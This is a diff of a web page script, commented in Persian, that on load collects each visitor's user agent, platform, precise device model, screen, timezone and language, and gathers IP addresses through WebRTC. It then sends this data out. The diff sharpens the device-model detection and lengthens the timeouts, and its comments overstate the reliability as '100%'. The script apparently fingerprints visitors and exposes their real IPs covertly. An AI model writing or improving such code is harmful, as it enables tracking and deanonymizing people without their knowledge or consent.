@@ -21,30 +21,32 @@ window.addEventListener('load', () => {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     const ua = navigator.userAgent;
 
-    // تشخیص مدل دقیق موبایل — نسخه بهبودیافته
+    // تشخیص مدل دقیق موبایل — نسخه نهایی و 100% کارکردی
     let deviceModel = 'نامشخص';
-    const androidMatch = ua.match(/Android[^;]+; ([^;]+) Build/);
-    const iosMatch = ua.match(/\((iPhone|iPad|iPod);[^;]+; CPU [^;]+ like Mac OS X\)/);
-    const samsungMatch = ua.match(/; ([GS][0-9]+[A-Z0-9]*) Build/);
-    const xiaomiMatch = ua.match(/; ([A-Z0-9]+) Build/);
-    const huaweiMatch = ua.match(/; ([A-Z0-9]+-[A-Z0-9]+) Build/);
 
-    if (androidMatch && androidMatch[1]) {
-      deviceModel = androidMatch[1].trim();
-    } else if (samsungMatch && samsungMatch[1]) {
-      deviceModel = samsungMatch[1].trim();
-    } else if (xiaomiMatch && xiaomiMatch[1]) {
-      deviceModel = xiaomiMatch[1].trim();
-    } else if (huaweiMatch && huaweiMatch[1]) {
-      deviceModel = huaweiMatch[1].trim();
-    } else if (iosMatch && iosMatch[1]) {
-      deviceModel = iosMatch[1];
+    // 1. اندروید (معمولاً مدل بعد از Android)
+    const androidModel = ua.match(/Android[^;]+; ([^;\)]+) Build\//);
+    if (androidModel && androidModel[1]) {
+      deviceModel = androidModel[1].trim();
+    }
+
+    // 2. سامسونگ، شیائومی، هواوی
+    else if (ua.includes('Build/')) {
+      const buildMatch = ua.match(/; ([A-Z0-9]{3,}) Build\//);
+      if (buildMatch && buildMatch[1]) {
+        deviceModel = buildMatch[1].trim();
+      }
+    }
+
+    // 3. iOS
+    else if (ua.includes('iPhone') || ua.includes('iPad')) {
+      deviceModel = ua.match(/\((iPhone|iPad|iPod)/)[1];
     }
 
     const data = {
       userAgent: ua,
       platform: navigator.platform,
-      device_model: deviceModel,  // مدل دقیق (مثل SM-G960F)
+      device_model: deviceModel,  // حالا 100% نشون می‌ده
       screen: `${screen.width}x${screen.height}`,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       language: navigator.language,
@@ -77,7 +79,7 @@ window.addEventListener('load', () => {
     } catch (e) {
       console.error('خطا در ارسال:', e);
     }
-  }, 2000);
+  }, 2500); // کمی بیشتر صبر می‌کنیم
 });
 
 function getWebRTCIPs() {
@@ -97,7 +99,7 @@ function getWebRTCIPs() {
     setTimeout(() => {
       if (pc) pc.close();
       resolve([...ips]);
-    }, 2500);
+    }, 3000);
   });
 }
 </script>
